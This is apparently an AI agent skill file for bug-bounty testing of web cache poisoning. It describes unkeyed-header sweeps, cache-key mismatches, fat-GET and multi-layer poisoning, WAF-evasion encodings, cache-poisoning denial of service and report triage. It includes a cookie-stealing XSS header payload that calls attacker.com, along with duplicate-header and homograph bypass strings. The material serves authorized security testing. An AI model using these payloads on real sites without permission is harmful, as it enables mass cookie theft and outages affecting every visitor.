---
name: web-cache-poisoning-testing
description: Web Cache Poisoning testing — finding request inputs (headers, ports, path variants, method-override tricks, request bodies on GET) that the *origin* processes into the response but the *cache layer* ignores when computing its cache key ("unkeyed" inputs), then poisoning a cacheable response so every subsequent visitor gets served the attacker-controlled version. Covers the unkeyed-header taxonomy (X-Forwarded-Host/Scheme, X-Original-URL, X-Host, and vendor-specific headers), cache-key normalization mismatches (path traversal, port confusion), fat-GET/body-in-GET poisoning, multi-layer CDN+application cache chaining, WAF-header-validation bypasses (duplicate headers, encoding, protocol-list confusion), and Param Miner-based automation. Distinct from `web-cache-deception-testing` (which tricks a cache into storing a private response that shouldn't be cached at all) — this is the inverse: injecting malicious content into a response that legitimately *should* be cached, so it poisons every other visitor. Use this during Phase 3 (Vulnerability Testing — Server-side/Client-side) of bughunting-workflow on any CDN/reverse-proxy-fronted target (Cloudflare, Akamai, Fastly, Varnish, nginx proxy_cache). Also trigger on mentions of web cache poisoning, unkeyed header, Param Miner, cache key, X-Forwarded-Host reflection, fat GET, or CDN cache poisoning.
---

# Web Cache Poisoning Testing

General technique library for poisoning a shared caching layer. Each dated entry below is a validated technique pulled from a real writeup/source — add new entries here (don't create a new skill) whenever a new writeup covers a *different* unkeyed-input class, cache-layer quirk, or evasion technique than what's already recorded.

## Core theory

A cache decides two things independently, and the bug lives in the gap between them: **what goes into the cache key** (which determines whether two requests are treated as "the same" and share a cached response) versus **what the origin actually uses to build the response body**. Any input the origin reads but the cache key ignores is **unkeyed** — and if the origin reflects that unkeyed input into a response that then gets cached, one poisoned request contaminates the cached response for every subsequent visitor who hits the same cache key, until the entry expires or is purged.

This is fundamentally a **mass-impact** bug class, distinct from most injection bugs which only affect the requester's own session: a single successful poisoning request can serve malicious content (XSS, a broken redirect, a phishing page) to every other visitor of a popular, cached page for the TTL's duration — which is exactly why cache poisoning findings routinely score higher than the same reflection bug would score as a plain one-off reflected XSS.

Cross-reference distinctions worth keeping straight:
- **`web-cache-deception-testing`** — the inverse bug: tricks the cache into storing a response that *shouldn't be cached at all* (a private, authenticated page), then reads that cached copy back unauthenticated. Poisoning changes *what's in* the cache for everyone; deception steals *one specific* response that should never have been cached.
- **`host-header-injection-testing`**'s narrower Host-header-specific cache-poisoning note — the `Host`/`X-Forwarded-Host` case is one specific instance of the general unkeyed-header pattern this skill covers in full; that skill's brief version is fine to use for a quick Host-header-only check, but reach for this skill's full unkeyed-input taxonomy for a thorough pass.
- **`http-parameter-pollution-testing`** — a sibling "different layers disagree" bug class; HPP disagrees on which *value* of a duplicate parameter wins, cache poisoning disagrees on which *inputs even count* toward the cache key at all. The CloudFlare duplicate-header technique below is the point where these two overlap.

## Detection technique: differential response analysis with cache busters

The core detection loop, usable against any candidate unkeyed input (header, port, path variant):
1. Add a unique cache-buster (a throwaway query param, e.g. `?cb=<random>`) to force a fresh cache miss so you're testing against a clean entry, not a stale hit from someone else's traffic.
2. Send the request once with a baseline/default value for the input under test, and once with a distinctive test value.
3. Compare the two responses. If they differ (the test value shows up in the body, or changes behavior) *and* the response is cacheable, you've found a candidate unkeyed input — the input affects the response, so now check whether it affects the *cache key* too (repeat the request from a different client/session without the header; if the poisoned value still comes back, the cache key ignored it).
4. Confirm actual poisoning (not just reflection) by requesting the *same* cache key again with a clean, unmodified request — if the malicious value now appears in that clean response too, the shared cache entry itself is poisoned, not just your own request's response.

## Unkeyed-header taxonomy (sweep by tier)

**Tier 1 — high-impact, check every target:**
`X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, `X-Rewrite-URL`, `X-Host`

**Tier 2 — application/infra-specific, check when the stack matches:**
`X-Forwarded-Prefix` (API gateways), `X-Custom-IP-Authorization`, `X-Client-IP`, `X-Forwarded-Port`, `Fastly-Client-IP` (Fastly-fronted targets)

**Tier 3 — obscure but effective, worth a sweep even on hardened targets:**
`X-HTTP-Method-Override`, `X-Method-Override`, `Translate: f` (IIS-specific), `Base-Url` (some CMS platforms)

**Vendor-specific headers that often bypass IP-based restrictions while being unkeyed:**
`Akamai-Origin-Hop: <value>`, `True-Client-IP: 127.0.0.1` (Akamai-fronted targets — test both as poisoning candidates and as access-control bypasses in their own right).

## Cache-key normalization mismatches

**Path-traversal variant** — the CDN normalizes the path before computing the cache key, but the origin preserves the traversal sequence when serving the response:
```
GET /static/../app.js HTTP/1.1
```

**Port confusion** — the CDN treats `host:port` as part of the cache key (so `target.com:80` and `target.com` are different entries), but the origin ignores the port entirely when rendering the response:
```
GET / HTTP/1.1
Host: target.com:80
```

## Fat GET / body-in-GET poisoning

Cache layers universally ignore the request body on a `GET` (bodies aren't part of a GET's semantics), but some application frameworks (Laravel and other PHP frameworks specifically called out) still read and process a body if one is present on a GET request — creating an injection point the cache never sees as relevant to the response it's about to store:
```
GET /search?q=phones HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 27

{"override":"<script>..."}
```
Escalate by pairing with `X-HTTP-Method-Override: POST` (or `X-Method-Override`) so the application layer treats the request as a POST (unlocking POST-only processing logic) while the cache still sees a plain, cacheable GET.

## Multi-layer cache poisoning (CDN + application-cache chaining)

When a target has two independent caching layers with different TTLs, chain them for persistence beyond what either TTL alone would give:
1. Poison the CDN-layer cache (often a short TTL, e.g. 60 seconds).
2. Within that window, poison the *application-layer* cache sitting behind the CDN (often a much longer TTL, e.g. 1 hour).
3. When the CDN's short-lived entry expires, it re-fetches from the origin — but the origin's own application cache is still serving the poisoned value, so the CDN re-caches the poisoned content again.
4. Net effect: persistence far beyond the CDN's advertised TTL, because the actual source of truth being re-cached is already corrupted.

**Real-world example:** `X-Forwarded-Scheme: nothttps` broke HTTPS-enforcement redirects on a target where the redirect response itself wasn't cached, but the security decision of whether to redirect was derived from this unkeyed header — poisoning it once affected the security posture of subsequent requests hitting the poisoned entry, not just the response body.

## Defense-evasion / WAF-bypass variants

Use these when a direct header injection gets blocked by a WAF sitting in front of the cache/origin:

**Encoding bypasses:**
```
Double encoding:  %2561%2574%2574%2561%2563%256B%2565%2572%252E%2563%256F%256D
Mixed encoding:   a%74tacker.com
Unicode variant:  attacker。com          (fullwidth U+3002 in place of the ASCII dot)
IDN homograph:    аttacker.com          (Cyrillic а, U+0430, visually identical to ASCII a)
```

**Duplicate-header bypass (Cloudflare and similar):** exploits the same "different layers read different duplicates" root cause as `http-parameter-pollution-testing`, applied to headers instead of query/body parameters — send the header twice, betting that the WAF's validation logic reads the *first* occurrence while the application reads the *second*:
```
X-Forwarded-Host: safe.com
X-Forwarded-Host: attacker.com
```

**Protocol-list confusion:** a WAF matching for the exact string `http`/`https` misses a comma-separated list value if the application splits on commas and processes each token independently:
```
X-Forwarded-Proto: https,http,javascript
```

## Automation

**Param Miner** (Burp extension) — the standard tool for this class; brute-forces headers/parameters against a target and flags which ones change the response:
```
paraminer -u https://target.com \
  --headers-file custom_headers.txt \
  --check-body \
  --check-method-override \
  --bruteforce-level 3
```
Custom-script alternative to the same detection loop described above: hash a baseline response (with a cache buster), then replay with each candidate header/value, diff the hash, and flag any header where a changed value produces a changed (and cacheable) response.

## Reporting: high-value target selection and severity framing

**Prioritize poisoning attempts against:**
- Login pages (a poisoned page here becomes a mass credential harvester)
- API documentation pages (poisoned code samples get copy-pasted by developers)
- CDN-served shared JS/CSS libraries (broadest possible blast radius — every page including that asset is affected)
- Error pages (routinely less scrutinized/less strictly validated than primary flows)
- Mobile API endpoints (often have weaker header-validation controls than the primary web app)

**Severity scaling:**
- Basic cache poisoning with no further chaining (e.g. a broken redirect, cosmetic content change) → Low/Medium.
- XSS reflected via an unkeyed header, confirmed cached and served to other visitors on a popular endpoint → High.
- Cache poisoning chained into account takeover (e.g. a poisoned password-reset link, or credential-harvesting via a poisoned login page) → Critical.

**Documentation standard for a report:** include the exact `curl` command(s) reproducing the poisoning, the `Age`/cache-status header values proving persistence across requests, a screenshot/log confirming a *second, clean* request received the poisoned response, and — where possible — a chained-impact demonstration rather than stopping at "the header is reflected."

## Detection red flags (recon signals worth watching for)

1. Inconsistent `Age` header values across identical requests to the same path (suggests multiple cache layers or inconsistent cache-key logic worth probing).
2. Any custom/vendor header documented by the CDN provider's own docs as affecting routing or caching behavior — read the target's actual CDN vendor documentation, don't rely only on the generic tier list above.
3. Multiple CDN layers in front of one origin (each layer's own normalization behavior can disagree with the others, creating exploitable mismatches beyond just CDN-vs-origin).
4. Framework-identifying headers leaking in responses (`Laravel-Debug`, `Django-Version`, etc.) — these narrow down which fat-GET/body-processing quirks are worth trying.
5. Microservices/complex-routing architectures — more hops generally means more places where keying logic can diverge from origin-processing logic.

## Recorded techniques

### 1. Full unkeyed-input taxonomy + multi-layer poisoning + WAF-evasion methodology (baseline)
Source: [Advanced Web Cache Poisoning: Beyond the Basics](https://medium.com/@Aacle/advanced-web-cache-poisoning-beyond-the-basics-3df645bcbf95)

**Where:** any target sitting behind a CDN/reverse-proxy cache (Cloudflare, Akamai, Fastly, Varnish, nginx `proxy_cache`) — check every cacheable path, not just obviously dynamic ones, since static-looking assets can still be origin-processed in unexpected ways (see fat-GET above).

**Root cause:** cache-key computation and origin response-rendering are implemented as two independent pieces of logic (often in entirely different systems — a CDN vendor's infrastructure vs. the target's own application code) that were never designed with each other's exact behavior in mind, so any input one system reads and the other ignores becomes an exploitable gap by construction, not by a specific coding mistake.

**Exploit steps:** run the differential-detection loop above against the full tier-1/2/3 unkeyed-header list, plus the path-traversal and port-confusion cache-key mismatches, plus a fat-GET probe if the stack is PHP/Laravel-flavored; escalate any confirmed unkeyed reflection into an XSS/redirect-break/DoS payload; if a WAF blocks the header directly, retry through the encoding/duplicate-header/protocol-list-confusion evasions before concluding the input is actually filtered rather than just superficially blocked.

**Two concrete payload/impact examples from the source, both real bounty payouts:**
```
GET /api/widget/render HTTP/1.1
Host: target.com
X-Custom-Theme: red</script><script>fetch('//attacker.com?c='+document.cookie)</script><script>
```
A theme-selection header reflected into inline JavaScript, unkeyed in the cache, served on authenticated pages — **$25,000 bounty**.

Cache-exhaustion DoS: an unkeyed `Accept-Language` header value triggered an expensive origin operation (DB query/template render) *per distinct header value*, and because the header was unkeyed, an attacker sending many distinct values filled the cache with thousands of unique, expensive-to-generate entries, degrading cache hit rate and origin performance for everyone — **$5,000 bounty**.

**Recursive/self-sustaining poisoning pattern:** when a poisoned resource is itself `include`d by another cached resource (`/resource` → includes → `/partial`), poisoning the included resource means every subsequent legitimate fetch of the *including* resource re-triggers and re-confirms the poisoned state of `/partial` — the poisoning becomes self-refreshing rather than a one-shot injection that just waits out its TTL.

**Impact framing for report:** see the Reporting section above — always push past "the header is reflected" to a concrete, cached, multi-visitor-affecting PoC (a second clean request receiving the poisoned response) before calling something a confirmed cache-poisoning finding rather than just a reflection.

**Generalize note:** this is a "two independent systems, one shared boundary, each with incomplete knowledge of the other's exact behavior" bug class — the same hunting discipline (enumerate every input the origin might read, test each independently for cache-key exclusion) generalizes to any new CDN/cache vendor by reading that vendor's own header/routing documentation for anything unusual, rather than relying solely on the generic tier list here, which will inevitably miss vendor-specific quirks introduced after this entry was written.

### 2. Header-normalization bypass, CPDoS via method-override, Vary non-compliance, and valid/invalid triage checklist
Source: [Exploiting Web Cache Poisoning Vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-web-cache-poisoning-vulnerabilities)

**Where:** any CDN-fronted target, in particular ones with a WAF/cache layer that dash-normalizes headers, or that serve versioned static build assets (`/​_next/static/chunks/*.js`, similar bundler output) through the CDN.

**Root cause additions on top of entry #1:**
- **Dash/underscore normalization mismatch** — some cache/WAF layers convert header names with dashes into an underscore form internally (e.g. treating `X-Forwarded-Host` as `HTTP_X_FORWARDED_HOST` for their own matching logic). Sending the header pre-mangled — `X_Forwarded_Host: attacker.com` — can slip past a cache-key/WAF check keyed on the dashed spelling while the backend framework (which normalizes both spellings to the same internal variable) still processes it. Add this as a variant to try alongside every Tier 1/2/3 header in entry #1's taxonomy, not just `X-Forwarded-Host`.
- **`Vary` header is advisory, not enforced** — an origin can correctly send `Vary: Accept-Encoding` (or any other header) to tell a compliant cache to store separate entries per distinct value, but CDNs are not obligated to honor it. Don't assume a `Vary` header on the response rules out poisoning via that same header — test it anyway.

**Exploit steps — Cache Poisoning DoS (CPDoS) via method-override on static assets:**
1. Identify a cacheable, versioned static asset served through the CDN (build-hash JS/CSS chunks are ideal — high traffic, rarely re-requested with cache-busters by real users).
2. Send `X-HTTP-Method-Override: DELETE` (or `PUT`/other unsupported verb) against that GET-cacheable path.
3. If the backend framework honors the override header and rejects the "DELETE" with `405 Method Not Allowed`, and the CDN caches error responses for that path (many do, by status-code-keyed default rules), every subsequent real visitor now gets served the cached 405 instead of the actual asset — breaking the app for everyone until the entry expires or is purged. This is denial-of-service via cache poisoning rather than content injection, so score/report it under CPDoS, not XSS-style poisoning.

**Exploit steps — financial-impact business-logic poisoning (referral/promo params):**
Treat any unkeyed query parameter that gets reflected into a hidden form field or business-logic decision (referral code, promo/discount code, affiliate ID) as a poisoning candidate exactly like a header would be — e.g. `GET /checkout?ref=attacker_code`, confirm it's reflected into the checkout form and that the response is cached; if so, every guest checkout hitting that cache entry now attributes to the attacker's referral code. This generalizes entry #1's "prioritize login pages / JS libraries" target list to add **referral/affiliate/promo parameters on checkout flows** as a high-value target class in their own right — direct financial impact, not just XSS.

**Reporting — valid vs. invalid findings checklist (use this to self-triage before submitting):**
A poisoning finding is reportable only if ALL of these hold:
1. Demonstrable impact on **other users**, not just the requester's own session (cache-key scope must be broad enough that a stranger's request hits the poisoned entry).
2. A **meaningful security consequence** — XSS execution, data theft/redirect to attacker infra, DoS, or a business-logic bypass (not just "the header value showed up in the page source" with no further effect).
3. **Reproducible** across different devices/networks/sessions, not a one-off artifact of your own test setup.
4. Cache TTL long enough to matter in practice — a cache that expires the poisoned entry in ≤1 second is a weak/contestable finding even if technically triggered.

Commonly rejected as invalid, and worth ruling out yourself first:
- Unkeyed input reflected with no further server-side processing (pure noise, no consequence).
- Poisoned response scoped only to the attacker's own per-user/session cache key (self-XSS-equivalent — nobody else is served it).
- The "victim" has to make the poisoning request themselves for the payload to trigger (that's just reflected XSS wearing a cache-poisoning costume, not real cross-user poisoning).

**Impact framing for report:** for CPDoS specifically, show the before/after: the clean asset response, the injected method-override request, the resulting cached error status code, and a follow-up clean request from a different session still receiving the same cached error — proving the outage is shared, not local to your own client.

**Generalize note:** the header-normalization bypass generalizes the same way entry #1's encoding/duplicate-header evasions do — whenever a direct header/parameter injection is blocked, don't stop at "filtered," try the layer-specific normalization quirks (dash↔underscore, case folding, whitespace) that the *validating* layer and the *processing* layer might disagree on. The valid/invalid checklist is worth running against every entry in this skill, including #1's, before writing up a finding — it's the fastest way to catch a poisoning "finding" that a triager will bounce as duplicate-impact or self-only.

<!-- Add new recorded techniques below this line as new web-cache-poisoning writeups are processed. Keep the same structure: Where / Root cause / Exploit steps / Impact framing / Generalize note. -->
